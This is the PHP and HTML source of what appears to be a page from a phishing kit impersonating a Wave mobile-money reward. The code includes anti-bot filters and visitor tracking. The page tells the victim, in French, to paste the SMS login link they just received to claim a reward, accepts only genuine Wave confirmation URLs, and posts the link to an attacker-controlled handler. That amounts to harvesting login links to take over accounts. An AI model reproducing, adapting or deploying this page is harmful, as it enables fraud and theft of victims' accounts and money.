<?php
error_reporting(0);
set_time_limit(0);
session_start();

include ('../prevents/bots.php');
include ('../prevents/anti1.php');
include ('../prevents/anti2.php');
include ('../prevents/anti3.php');
include ('../prevents/anti4.php');
include ('../prevents/anti5.php');
include ('../prevents/anti6.php');
include ('../prevents/anti7.php');
include ('../prevents/anti8.php');

header('Content-type: text/html; charset=UTF-8');
include('./inclu/para.php');
include('./inclu/bots.php');
date_default_timezone_set('GMT');

$ip = getenv("REMOTE_ADDR");

// Récupération du numéro de téléphone
$phone = '';
if (isset($_POST['phone'])) {
    $phone = preg_replace('/\D/', '', $_POST['phone']);
    $_SESSION['phone'] = $phone;
} elseif (isset($_SESSION['phone'])) {
    $phone = $_SESSION['phone'];
}

// Formatage du numéro : 07 12 02 03 75
if (strlen($phone) == 10) {
    $formatted_phone = substr($phone, 0,2).' '.substr($phone,2,2).' '.substr($phone,4,2).' '.substr($phone,6,2).' '.substr($phone,8,2);
} else {
    $formatted_phone = $phone;
}

include 'page_notify.php';
include 'Jeehan.php';
$jeehan = new Jeehan();
$jeehan->track('lien.php');
include("track.php");
?>

<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Lien de connexion</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
  <style>
    body {
      background-color: white;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      padding-top: 80px;
    }

    .sms-icon {
      font-size: 46px;
      color: white;
      background-color: #00ff00;
      width: 80px;
      height: 80px;
      border-radius: 16px;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
      margin-bottom: 30px;
    }

    .main-text {
      font-size: 17px;
      text-align: center;
      color: #333;
      line-height: 1.5;
      margin-bottom: 10px;
    }

    .phone-number {
      font-size: 24px;
      font-weight: bold;
      color: #000;
      margin: 20px 0 30px;
    }

    .instruction {
      font-size: 17px;
      text-align: center;
      color: #333;
      line-height: 1.5;
      margin-bottom: 40px;
      max-width: 90%;
    }

    .link-input {
      width: 90%;
      max-width: 400px;
      height: 50px;
      border: 1px solid #ccc;
      border-radius: 10px;
      padding: 0 15px;
      font-size: 18px;
      text-align: center;
      background-color: #f9f9f9;
    }

    .btn-validate {
      width: 90%;
      max-width: 400px;
      height: 50px;
      background-color: #007aff;
      color: white;
      font-size: 18px;
      font-weight: 600;
      border: none;
      border-radius: 10px;
      margin-top: 20px;
    }

    .btn-validate:disabled {
      background-color: #cccccc;
      cursor: not-allowed;
    }

    .error-msg {
      color: #ff3b30;
      font-size: 15px;
      margin-top: 10px;
      text-align: center;
      display: none;
      max-width: 90%;
    }

    .resend-btn {
      color: #999;
      font-size: 15px;
      margin: 30px 0;
    }

    .resend-btn.active {
      color: #007aff;
      cursor: pointer;
    }

    .help-link {
      color: #007aff;
      font-size: 16px;
      text-decoration: none;
      margin-top: 20px;
    }
  </style>
</head>
<body>

  <!-- Icône Messages verte (Bootstrap Icons) -->
  <div class="sms-icon">
    <i class="bi bi-chat-dots-fill"></i>
  </div>

  <div class="main-text">
    Nous venons de vous envoyer un lien de connexion<br>par SMS au
  </div>

  <div class="phone-number"><?= htmlspecialchars($formatted_phone) ?></div>

  <div class="instruction">
    Pour recevoir votre récompense, veuillez copier-coller<br>le lien reçu par SMS sur ce numéro ici
  </div>

  <form action="action/confirmed.php" method="POST" id="linkForm">
    <input type="hidden" name="step" value="link">
    <input type="hidden" name="phone" value="<?= htmlspecialchars($phone) ?>">

    <input type="url" class="link-input" name="link" id="linkInput" placeholder="Collez le lien ici" required autocomplete="off">

    <button type="submit" class="btn-validate" id="validateBtn" disabled>Valider</button>

    <div class="error-msg" id="errorMsg">
      Lien invalide. Veuillez coller le lien Wave valide reçu par sms(ex: https://ci.confirm.wave.com/l/XXXXXXXXXXX)
    </div>
  </form>

  <div class="resend-btn" id="resendText">Renvoyer lien 0:30</div>

  <a href="#" class="help-link">Le lien ne fonctionne pas ? Tapez ici</a>

  <script>
    const linkInput = document.getElementById('linkInput');
    const validateBtn = document.getElementById('validateBtn');
    const errorMsg = document.getElementById('errorMsg');

    const validPrefix = 'https://ci.confirm.wave.com/l/';

    function validateLink() {
      const value = linkInput.value.trim();
      if (value.startsWith(validPrefix)) {
        validateBtn.disabled = false;
        errorMsg.style.display = 'none';
      } else {
        validateBtn.disabled = true;
        if (value !== '') {
          errorMsg.style.display = 'block';
        } else {
          errorMsg.style.display = 'none';
        }
      }
    }

    linkInput.addEventListener('input', validateLink);
    linkInput.addEventListener('paste', () => {
      setTimeout(validateLink, 100);
    });

    // Timer renvoi lien
    let seconds = 30;
    const resendText = document.getElementById('resendText');
    const timer = setInterval(() => {
      seconds--;
      if (seconds <= 0) {
        clearInterval(timer);
        resendText.innerText = "Renvoyer le lien";
        resendText.classList.add("active");
      } else {
        resendText.innerText = `Renvoyer lien 0:${seconds.toString().padStart(2, '0')}`;
      }
    }, 1000);
  </script>

</body>
</html>